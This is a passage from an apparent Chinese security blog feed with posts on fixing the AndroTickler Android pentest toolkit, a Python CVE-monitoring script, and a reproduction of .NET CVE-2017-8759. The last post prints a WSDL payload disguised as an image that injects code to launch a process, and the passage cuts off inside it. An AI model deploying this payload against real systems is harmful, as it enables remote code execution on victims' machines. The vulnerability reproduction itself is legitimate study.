H:/AndroTickler/com.jnu.ctf2017//</code><br>测试后发现，使用<code>adb pull</code>导出文件时，pc的路径最后不能有<code>\</code>或者<code>/</code><br><img src="%E5%AF%BC%E5%87%BA%E6%B5%8B%E8%AF%95.jpg" alt="导出测试"></p><p>直接修改base\FileUtil.java中copyDirToHost方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest+"/"); by fuping</span></span><br><span class="line"><span class="keyword">this</span>.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest);</span><br></pre></td></tr></table></figure><p>修改base\FileUtil.java中pullFromSDcard方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pullFromSDcard</span><span class="params">(String src, String dest)</span> </span>&#123;</span><br><span class="line">String fName = <span class="keyword">this</span>.getFileNameFromPath(src);</span><br><span class="line"><span class="keyword">this</span>.warnOverrideAndDelete(dest+fName);</span><br><span class="line"><span class="comment">//by fuping</span></span><br><span class="line">File f  = <span class="keyword">new</span> File(dest);</span><br><span class="line"><span class="keyword">if</span>(!f.exists())&#123;</span><br><span class="line">f.mkdirs();</span><br><span class="line">&#125;<span class="comment">// by fuping</span></span><br><span class="line">dest = f.getPath();</span><br><span class="line">String command = <span class="string">"nox_adb pull "</span>+src+<span class="string">" "</span>+dest;</span><br><span class="line"><span class="keyword">int</span> pullResult=<span class="keyword">this</span>.commando.executeProcessForAdbPull(command);</span><br><span class="line"><span class="keyword">this</span>.deleteDirFromDevice(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF6.jpg" alt="查看app信息6"></p><p>还有一些需要更改的地方，例如将代码中调用dex2jar-2.1的<code>.sh</code>脚本改为<code>.bat</code> 。之后在编译运行。</p><p><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF7.jpg" alt="查看app信息7"><br>此时这个工具才能算可以使用，还有其他功能（例如Frida），我并未测试。当然还可能还会有其他问题，这里就不再深入了。</p><p>这里放上一个查看app详细信息的结果。<br><img src="%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF1.jpg" alt="详细信息1"><br><img src="%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF2.jpg" alt="详细信息2"></p><blockquote><p>可以看到安装日期、使用权限、数据库存储等等信息。</p></blockquote><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>虽然看起来在运行的时候有很多坑，但其原因也是环境的问题（我采用的是Windows）。而且我使用了模拟器而不是真机，所以也可能造成一些问题。但是这些都是无关紧要的，都是很小的错误，修改一下就可以用了。我这里仅仅使用了查看app信息的功能，并未测试其他功能。更多功能可以参考<a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">https://github.com/ernw/AndroTickler</a> 。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;AndroTickler是一款用于Android应用程序渗透测试和审计的工具包。更多介绍可以参考&lt;a href=&quot;https://github.com/ernw/AndroTickler&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/ernw/AndroTickler&lt;/a&gt; 。本文主要记录一下在使用过程中所遇到的问题和解决的方法。&lt;/p&gt;
&lt;p&gt;本文的测试环境如下：系统为win10 x64，jdk版本为java8，gradle版本为4.1。采用了夜神模拟器。&lt;/p&gt;
&lt;p&gt;主要包括以下几个方面。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;编译环境的准备&lt;/li&gt;
&lt;li&gt;使用过程中遇到的问题以及解决方法&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="工具使用" scheme="https://fuping.site/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="安卓" scheme="https://fuping.site/tags/%E5%AE%89%E5%8D%93/"/>
    
      <category term="AndroTickler" scheme="https://fuping.site/tags/AndroTickler/"/>
    
  </entry>
  
  <entry>
    <title>CVE监控之Python代码实现</title>
    <link href="https://fuping.site/2017/12/11/NEW-CVE-Monitor/"/>
    <id>https://fuping.site/2017/12/11/NEW-CVE-Monitor/</id>
    <published>2017-12-11T07:44:05.000Z</published>
    <updated>2017-12-11T10:44:04.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>前几天在先知上看到<a href="https://xianzhi.aliyun.com/forum/topic/1694/" target="_blank" rel="noopener">伪全栈式安全研发：CVE监控</a>这篇文章，就想着也实现一下代码进行最新CVE的监控。语言采用了Python，数据库也为Mongodb数据库。代码和实现的什么不重要，重要的是过程。</p><p>主要包括以下几个方面。</p><ol><li>获取最新的CVE列表和详情<br>主要采用了python的requests模块和BeautifulSoup模块。</li><li>将最新的CVE信息存入数据库<br>数据库使用了Mongodb，采用了pymongo模块。</li><li>通过邮件发送最新的CVE信息<br>发送邮件采用了smtplib模块。</li><li>定时执行任务<br>使用了linux的crontab来实现。</li></ol><a id="more"></a><h1 id="0x02-实现过程"><a href="#0x02-实现过程" class="headerlink" title="0x02 实现过程"></a>0x02 实现过程</h1><h2 id="1-获取最新的CVE列表和详情"><a href="#1-获取最新的CVE列表和详情" class="headerlink" title="1. 获取最新的CVE列表和详情"></a>1. 获取最新的CVE列表和详情</h2><p>访问<a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a> ，可以获取每天新增的CVE信息。</p><p><img src="%E6%8E%A5%E5%8F%A31.jpg" alt="接口1"></p><p><img src="%E6%8E%A5%E5%8F%A31%E6%BA%90%E4%BB%A3%E7%A0%81.jpg" alt="接口源代码"><br>通过查看源代码，发现没html没什么规律可言，都是些超链接。要想获取最新的列表，可以通过取文本中间的方法来获取。<br>这里需要获取<code>New entries:</code>和<code>Graduations</code>之间的内容。然后通过BeautifulSoup来解析其中的超链接。<br>主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCVES</span><span class="params">()</span>:</span><span class="comment"># 获取最新到CVE列表</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">'https://cassandra.cerias.purdue.edu/CVE_changes/today.html'</span></span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">60</span>)</span><br><span class="line">        CVEList_html = getMiddleStr(res.text, <span class="string">'New entries:'</span>, <span class="string">'Graduations'</span>)</span><br><span class="line">        soup = BeautifulSoup(CVEList_html, <span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">            print(a[<span class="string">'href'</span>])</span><br><span class="line">            print(a.string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure><p>获取文本中间内容的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMiddleStr</span><span class="params">(content, startStr, endStr)</span>:</span> <span class="comment"># 获取文本中间内容</span></span><br><span class="line">    startIndex = content.index(startStr)</span><br><span class="line">    <span class="keyword">if</span> startIndex &gt;= <span class="number">0</span>:</span><br><span class="line">        startIndex += len(startStr)</span><br><span class="line">        endIndex = content.index(endStr)</span><br><span class="line">    <span class="keyword">return</span> content[startIndex:endIndex]</span><br></pre></td></tr></table></figure><p>运行效果：<br><img src="%E8%8E%B7%E5%8F%96CVE%E5%88%97%E8%A1%A8.jpg" alt="获取cve列表"><br>超链接的地址是CVE的详情。随便进入一个查看效果。<br>例如：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874</a><br><img src="CVE%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF.jpg" alt="CVE详细信息"><br>这里需要记录的信息有：CVE-ID、Description、Assigning CNA和Date Entry Created。</p><p><img src="CVE%E8%AF%A6%E6%83%85%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81.jpg" alt="CVE详情网页源代码"><br>通过查看网页源码发现，所有需要记录的信息在一个表格里面。但该页面有很多table，而且没有明显的标识来区分。而该table在div中，可以通过id来获取。<br>CVE-ID可以直接通过<code>soup.find(nowrap=&#39;nowrap&#39;).find(&#39;h2&#39;).string</code>获取。其他的几个信息可以通过获取相应tr中的td中的内容获得。<br><img src="%E8%8E%B7%E5%8F%96CVE%E8%AF%A6%E6%83%85.jpg" alt="获取CVE详情"><br>这样就可以获取最新的CVE列表和详情。</p><h2 id="2-将最新的CVE信息存入数据库"><a href="#2-将最新的CVE信息存入数据库" class="headerlink" title="2. 将最新的CVE信息存入数据库"></a>2. 将最新的CVE信息存入数据库</h2><p>数据库采用了Mongodb。安装方法<code>apt-get install mongodb</code><br>然后启动数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/data/ <span class="comment">#创建数据存储位置</span></span><br><span class="line">mongod --port 65521 --dbpath /var/data/ --bind_ip 127.0.0.1 <span class="comment">#启动mongodb，指定端口和路径，且仅本机可连</span></span><br><span class="line">mongo 127.0.0.1:65521/mydb </span><br><span class="line">db.createUser(&#123;user:<span class="string">'tass'</span>,<span class="built_in">pwd</span>:<span class="string">'liehu'</span>,roles:[&#123;role:<span class="string">'dbOwner'</span>,db:<span class="string">'mydb'</span>&#125;]&#125;) <span class="comment">#添加认证</span></span><br></pre></td></tr></table></figure><p>Mongodb数据库插入一条数据，一般使用的是insert。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.test.insert(&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test1"</span>&#125;)</span><br></pre></td></tr></table></figure><p>如果我们想实现一个如果title存在，就对数据进行更新，不存在，就插入。可以这样来实现。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.test.update(&#123;<span class="string">"title"</span>:<span class="string">"test2"</span>&#125;, &#123;<span class="variable">$set</span>:&#123;<span class="string">"title"</span>:<span class="string">"test2"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test2"</span>&#125;&#125;, &#123;upsert:<span class="literal">true</span>&#125;)</span><br><span class="line">db.test.update(&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>&#125;, &#123;<span class="variable">$set</span>:&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test3"</span>&#125;&#125;, &#123;upsert:<span class="literal">true</span>&#125;)</span><br><span class="line">db.test.find()</span><br></pre></td></tr></table></figure><p>执行完成后最终有两条数据，title分别为test1和test2，对应的内容为test3和test2.</p><p><img src="insertOrUpdate.jpg" alt="存在更新，不存在插入"><br>因此在插入数据的时候，我们可以直接使用<code>db.test.update({&quot;title&quot;:&quot;test2&quot;}, {$set:{&quot;title&quot;:&quot;test2&quot;, &quot;blog_cont&quot;:&quot;test2&quot;}}, {upsert:true})</code>这种方式来实现。</p><p><img src="%E6%8F%92%E5%85%A5%E6%B5%8B%E8%AF%95.jpg" alt="插入测试"><br>更新只需更改data内容即可。<br><img src="%E6%9B%B4%E6%96%B0%E6%B5%8B%E8%AF%95.jpg" alt="更新测试"></p><blockquote><p>为了数据库的安全性，使用<code>--bind_ip 127.0.0.1</code>来设置数据库仅本地可以连接。更多mongodb数据库的配置可以参考<a href="http://blog.csdn.net/guoxingege/article/details/47339885" target="_blank" rel="noopener">MongoDB Mongodb.conf 配置 Auth</a>。</p></blockquote><h2 id="3-通过邮件发送最新的CVE信息"><a href="#3-通过邮件发送最新的CVE信息" class="headerlink" title="3. 通过邮件发送最新的CVE信息"></a>3. 通过邮件发送最新的CVE信息</h2><p>发送邮件这里用到了smtplib。<br>发送邮件比较简单，就直接贴代码了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEmail</span><span class="params">(mail_msg)</span>:</span>  <span class="comment"># 发送邮件</span></span><br><span class="line">    sender = <span class="string">'from@163.com'</span> <span class="comment"># 发件人</span></span><br><span class="line">    password = <span class="string">'password'</span> <span class="comment"># 发件人密码</span></span><br><span class="line">    receiver = <span class="string">'receiver@163.com'</span> <span class="comment"># 收件人</span></span><br><span class="line">    message = MIMEText(mail_msg, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>) <span class="comment">#以文本发送</span></span><br><span class="line">    message[<span class="string">'From'</span>] = sender</span><br><span class="line">    message[<span class="string">'To'</span>] = receiver</span><br><span class="line"></span><br><span class="line">    subject = <span class="string">'最新CVE列表'</span></span><br><span class="line">    message[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        smtpObj = smtplib.SMTP(<span class="string">'smtp.163.com'</span>)</span><br><span class="line">        smtpObj.login(sender, password)</span><br><span class="line">        smtpObj.sendmail(sender, receiver, message.as_string())</span><br><span class="line">        print(<span class="string">'邮件发送成功'</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">        print(<span class="string">'Error: 无法发送邮件'</span>)</span><br></pre></td></tr></table></figure><h2 id="4-定时执行任务"><a href="#4-定时执行任务" class="headerlink" title="4. 定时执行任务"></a>4. 定时执行任务</h2><p>直接使用linux下的crontab来完成。<br>例如设置每天早上7点执行，可以这样设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 7 * * * python /myJob/CVE-Monitor.py &gt;&gt; /<span class="built_in">log</span>/CVE-Monitor.log</span><br></pre></td></tr></table></figure><blockquote><p>根据<a href="https://cassandra.cerias.purdue.edu/CVE_changes/" target="_blank" rel="noopener">https://cassandra.cerias.purdue.edu/CVE_changes/</a> 看到today.html更新的时间是明天的06:53，对应北京时间是19:53。若想及时获取，可以更换时间为20:00.</p></blockquote><h2 id="5-完善和优化"><a href="#5-完善和优化" class="headerlink" title="5.完善和优化"></a>5.完善和优化</h2><p>到这里监控脚本完成的差不多了，剩下就是如何来融合一起并改善了。<br>为了方便发送邮件内容和插入数据库，我们新建类CVEInfo。主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CVEInfo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url, cveid, description, company, createdate)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.cveid = cveid</span><br><span class="line">        self.description = description</span><br><span class="line">        self.company = company</span><br><span class="line">        self.createdate = createdate</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p&gt;&lt;b&gt;漏洞编号：&lt;/b&gt;&lt;a href="'</span>+self.url+<span class="string">'"&gt;'</span>+self.cveid+<span class="string">'&lt;/a&gt;&lt;/p&gt;&lt;b&gt;相关厂商：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.company +<span class="string">'&lt;br&gt;&lt;b&gt;披露日期：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.createdate+<span class="string">'&lt;br&gt;&lt;b&gt;漏洞描述：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.description + <span class="string">'&lt;br&gt;&lt;br&gt;&lt;hr/&gt;'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cveid'</span>: self.cveid,</span><br><span class="line">            <span class="string">'description'</span>: self.description,</span><br><span class="line">            <span class="string">'company'</span>: self.company,</span><br><span class="line">            <span class="string">'createdate'</span>: datetime.strptime(self.createdate, <span class="string">"%Y%m%d"</span>),</span><br><span class="line">            <span class="string">'addDate'</span>: time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime(time.time())),</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>为了美观，将邮件以html方式发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = MIMEText(mail_msg, <span class="string">'html'</span>, <span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>邮箱收到的效果：<br><img src="%E9%82%AE%E4%BB%B6%E5%86%85%E5%AE%B9.jpg" alt="邮件内容"><br>查看数据库数据：<br><img src="%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9.jpg" alt="数据库内容"></p><p>从上面两张图片可以看到有三十多个，但我们有时候并不是都需要看。我们可以根据Description中关键信息来进行过滤，仅仅将我们需要关注的CVE信息发送到邮箱或进行入库操作。<br>如下图为获取<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-8295" target="_blank" rel="noopener">CVE-2017-8295</a>的信息。<br><img src="%E6%B7%BB%E5%8A%A0%E5%85%B3%E9%94%AE%E5%AD%97%E5%8C%B9%E9%85%8D.jpg" alt="添加关键字匹配"><br>然后修改main方法，根据是否有关注的CVE信息来决定邮件的内容。<br>这里先用本地服务器为例，新建today.html文件，其中包含<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-9805" target="_blank" rel="noopener">CVE-2017-9805</a>和<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-16241" target="_blank" rel="noopener">CVE-2017-16241</a>。<br><img src="%E5%85%B3%E9%94%AE%E5%AD%97%E5%8C%B9%E9%85%8D.jpg" alt="关键字匹配"><br>运行代码结果打印了一条包含了我们的关键字的数据。<br>邮件中的内容如下所示：<br><img src="%E5%85%B3%E9%94%AE%E5%AD%97%E5%8C%B9%E9%85%8D%E9%82%AE%E4%BB%B6%E5%86%85%E5%AE%B9.jpg" alt="关键字匹配邮件内容"><br>这样就能过滤其他CVE信息，仅仅记录我们关注的内容了。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>本文主要用到了BeautifulSoup解析网页和mongodb数据库的使用，然后就可以将想要的内容保存到数据库中。脚本并不限于在此处使用，也可以修改一下抓取其他网站内容。<br>代码地址：<a href="https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py</a><br>查询的功能就不做了，若想实现其他功能，可以自行增加和修改。</p><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p>[1]<a href="https://xianzhi.aliyun.com/forum/topic/1694/" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/1694/</a><br>[2]<a href="http://blog.csdn.net/guoxingege/article/details/47339885" target="_blank" rel="noopener">http://blog.csdn.net/guoxingege/article/details/47339885</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;前几天在先知上看到&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/1694/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;伪全栈式安全研发：CVE监控&lt;/a&gt;这篇文章，就想着也实现一下代码进行最新CVE的监控。语言采用了Python，数据库也为Mongodb数据库。代码和实现的什么不重要，重要的是过程。&lt;/p&gt;
&lt;p&gt;主要包括以下几个方面。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取最新的CVE列表和详情&lt;br&gt;主要采用了python的requests模块和BeautifulSoup模块。&lt;/li&gt;
&lt;li&gt;将最新的CVE信息存入数据库&lt;br&gt;数据库使用了Mongodb，采用了pymongo模块。&lt;/li&gt;
&lt;li&gt;通过邮件发送最新的CVE信息&lt;br&gt;发送邮件采用了smtplib模块。&lt;/li&gt;
&lt;li&gt;定时执行任务&lt;br&gt;使用了linux的crontab来实现。&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="编程之美" scheme="https://fuping.site/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="CVE-Monitor" scheme="https://fuping.site/tags/CVE-Monitor/"/>
    
      <category term="Mongodb数据库" scheme="https://fuping.site/tags/Mongodb%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="Python" scheme="https://fuping.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>.NET框架0Day漏洞CVE-2017-8759复现过程</title>
    <link href="https://fuping.site/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/"/>
    <id>https://fuping.site/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/</id>
    <published>2017-09-14T02:07:20.000Z</published>
    <updated>2017-09-14T09:04:31.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">FireEye</a>最近检测到一个恶意的Microsoft Office RTF文档，利用<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759" target="_blank" rel="noopener">CVE-2017-8759</a>（一种SOAP WSDL解析器代码注入漏洞）。此漏洞允许在解析SOAP WSDL定义内容期间注入任意代码。</p><a id="more"></a><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞名称：.NET Framework远程代码执行漏洞<br>漏洞编号：CVE-2017-8759<br>漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统<br>利用场景：远程钓鱼、社会工程<br>影响版本：以下.NET版本<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.2<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5.1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.7<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.5.2<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 2.0 SP2<br>影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint</p><h1 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h1><p>PrintClientProxy方法中的WSDL解析器模块中存在代码注入漏洞。如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。这就造成了攻击者注入和执行任意代码。</p><p>这里不详细介绍了（因为我也不懂），可以参考火眼和360的分析。</p><p><img src="%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95.jpg" alt="本地测试"></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>新建一个图片文件，名字为office.png（其他格式也行），内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">definitions</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/soap/"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:suds</span>=<span class="string">"http://www.w3.org/2000/wsdl/suds"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tns</span>=<span class="string">"http://schemas.microsoft.com/clr/ns/System"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ns0</span>=<span class="string">"http://schemas.microsoft.com/clr/nsassem/Logo/Logo"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">portType</span> <span class="attr">name</span>=<span class="string">"PortType"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">binding</span> <span class="attr">name</span>=<span class="string">"Binding"</span> <span class="attr">type</span>=<span class="string">"tns:PortType"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">style</span>=<span class="string">"rpc"</span> <span class="attr">transport</span>=<span class="string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">suds:class</span> <span class="attr">type</span>=<span class="string">"ns0:Image"</span> <span class="attr">rootType</span>=<span class="string">"MarshalByRefObject"</span>&gt;</span><span class="tag">&lt;/<span class="name">suds:class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">"Service"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span> <span class="attr">name</span>=<span class="string">"Port"</span> <span class="attr">binding</span>=<span class="string">"tns:Binding"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://localhost?C:\Windows\System32\calc.exe?011"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">";</span></span></span><br><span class="line"><span class="tag"><span class="string">if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);</span></span></span><br><span class="line"><span class="tag"><span class="string">System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125; //"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span 